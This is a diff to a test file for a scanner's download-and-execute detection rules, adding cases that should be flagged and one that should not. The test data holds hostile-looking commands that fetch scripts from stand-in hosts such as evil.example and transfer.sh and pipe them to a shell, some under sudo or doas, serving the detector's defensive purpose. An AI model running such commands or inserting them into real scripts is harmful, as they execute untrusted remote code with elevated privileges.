@@ -6,7 +6,11 @@ describe('download-execute rules', () => {
   it.each([
     ['DLE-001', 'curl -s https://evil.example | sh'],
     ['DLE-001', 'curl -fsSL https://evil.example/install.sh | bash'],
+    ['DLE-001', 'curl -fsSL https://evil.example/install.sh | sudo sh'],
+    ['DLE-001', 'curl -fsSL https://evil.example/install.sh | sudo bash'],
+    ['DLE-001', 'curl -fsSL https://evil.example/install.sh | doas zsh'],
     ['DLE-002', 'wget -qO- https://evil.example | bash'],
+    ['DLE-002', 'wget -qO- https://evil.example | sudo bash'],
     ['DLE-003', 'curl -fsSL https://evil.example/payload -o /tmp/x && chmod +x /tmp/x'],
     ['DLE-003', 'curl -fsSL https://evil.example/payload --output /tmp/x && chmod +x /tmp/x'],
     ['DLE-003', 'wget https://evil.example/payload -O run.sh && ./run.sh'],
@@ -15,6 +19,7 @@ describe('download-execute rules', () => {
     ['DLE-004', 'sh <(curl -s https://evil.example/payload)'],
     ['PASTE-001', 'source=("https://pastebin.com/raw/abc123")'],
     ['PASTE-001', 'source=("https://temp.sh/xkcd/payload.sh")'],
+    ['PASTE-001', 'curl https://files.transfer.sh/x | sh'],
   ])('flags %s for %j', (id, line) => {
     expect(ruleById(DOWNLOAD_EXECUTE_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
   });
@@ -24,6 +29,8 @@ describe('download-execute rules', () => {
     ['DLE-003', 'curl -o icon.png https://example.org/icon.png'],
     ['DLE-004', 'eval "$(make check)"'],
     ['PASTE-001', 'source=("https://github.com/example/repo/archive/v1.tar.gz")'],
+    // The host must not match mid-word inside a longer label.
+    ['PASTE-001', 'source=("https://github.com/user/mypastebin.com/archive/v1.tar.gz")'],
   ])('does not flag %s for %j', (id, line) => {
     expect(ruleById(DOWNLOAD_EXECUTE_RULES, id).check(makeChange(addedOnlyDiff([line])))).toBeNull();
   });
